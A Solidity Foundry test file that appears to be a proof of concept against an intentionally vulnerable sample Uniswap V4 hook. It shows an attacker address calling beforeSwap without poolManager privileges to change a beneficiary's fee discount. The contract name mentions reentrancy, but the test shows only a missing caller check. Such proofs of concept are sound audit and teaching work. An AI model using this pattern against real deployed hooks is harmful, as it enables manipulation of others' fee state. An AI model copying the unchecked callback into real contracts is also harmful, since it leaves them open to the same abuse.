// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../../examples/sample_v4_hook_and_erc4626.sol";

contract POC_V4Hook_TransientReentrancy is Test {
    address internal attacker = address(0xBAD);
    address internal poolManager = address(0x1111);
    address internal beneficiary = address(0x9999);
    VulnerableUniswapV4Hook internal targetHook;

    function setUp() public {
        targetHook = new VulnerableUniswapV4Hook(poolManager);
        vm.deal(attacker, 10 ether);
    }

    /// @notice Proves that unauthorized third-party callers CAN invoke hook callbacks and manipulate fee discount state
    function test_Exploit_UnauthorizedCallerManipulatesHookState() public {
        assertEq(targetHook.feeDiscount(beneficiary), 0, "Initial fee discount must be 0");

        // Attacker directly calls beforeSwap without poolManager privileges
        vm.prank(attacker);
        bytes memory hookData = abi.encode(beneficiary);
        bytes4 selector = targetHook.beforeSwap(attacker, bytes32(0), 1000, hookData);

        assertEq(selector, targetHook.beforeSwap.selector);
        // Vulnerability proven: attacker successfully modified feeDiscount to 10
        assertEq(targetHook.feeDiscount(beneficiary), 10, "Attacker failed to alter fee discount");
    }

    /// @notice Invariant test verifying that the configured poolManager is not zero
    function test_PoolManagerConfigured() public view {
        assertEq(targetHook.poolManager(), poolManager);
    }
}